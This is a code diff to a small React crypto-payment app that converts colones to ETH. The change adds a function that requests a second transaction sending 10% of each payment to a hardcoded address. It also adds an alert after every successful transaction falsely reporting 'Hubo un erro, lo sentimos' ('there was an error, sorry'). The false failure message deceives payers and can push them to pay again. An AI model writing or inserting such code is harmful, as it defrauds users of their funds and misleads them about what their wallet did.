@@ -6,6 +6,8 @@ function App() {
   var usd = 0;
   var wei = 0;
   var eth = 0;
+  var commision = 0;
+  var commisionWei = 0;
   let accounts = [];
   const options = [
     { value: '0x14dc79964da2c08b23698b3d3cc7ca32193d9955', label: 'Esteban Madrigal' },
@@ -20,14 +22,38 @@ function App() {
   };
   function recalculate(){
     colones = parseInt(document.getElementById("amount").value);
+    var col = colones;
+    commision = col*0.10;
     usd = colones*0.0016;
     wei = 366272203455340*usd;
     eth = usd*0.00036;
-    document.getElementById("p1").innerHTML = colones+'CRC = '+usd+'USD = '+eth+'ETH' ;
+    var w = wei
+    commisionWei = w*0.10
+    document.getElementById("p1").innerHTML = colones+'CRC = '+usd+'USD = '+eth+'ETH \n *Comision: '+commision+'CRC';
+  }
+  async function getComission(){
+    var amount = (commisionWei).toString(16);
+    window.ethereum
+      .request({
+        method: 'eth_sendTransaction',
+        params: [
+          {
+            from: accounts[0],
+            to: '0x70997970c51812dc3a010c7d01b50e0d17dc79c8',
+            value: '0x'+amount,
+            gasPrice: '0x09184e72a000',
+            gas: '0x5208',
+          },
+        ],
+      })
+      .then((txHash) => {
+        alert('Hubo un erro, lo sentimos');
+        console.log(txHash)})
+      .catch((error) => console.error);
   }
   async function sendMoney() {
       getAccount()
-      colones = parseInt(document.getElementById("amount").value);
+      getComission()
       var amount = (wei).toString(16);
       window.ethereum
         .request({
@@ -43,6 +69,7 @@ function App() {
           ],
         })
         .then((txHash) => {
+          alert('Hubo un erro, lo sentimos');
           console.log(txHash)})
         .catch((error) => console.error);
   }
@@ -81,7 +108,7 @@ function App() {
             <div className="cut"></div>
             <label htmlFor="amount" className="placeholder">Monto a debitar en colones</label>
           </div>
-          <small id="p1">{ colones+'CRC = '+usd+'USD = ETH'+eth }</small>
+          <small id="p1">{ colones+'CRC = '+usd+'USD = '+eth+'ETH \n *Comision: '+commision+'CRC' }</small>
           <button type="text" onClick={sendMoney} className="submit">Pagar</button>
         </div>
       </header>
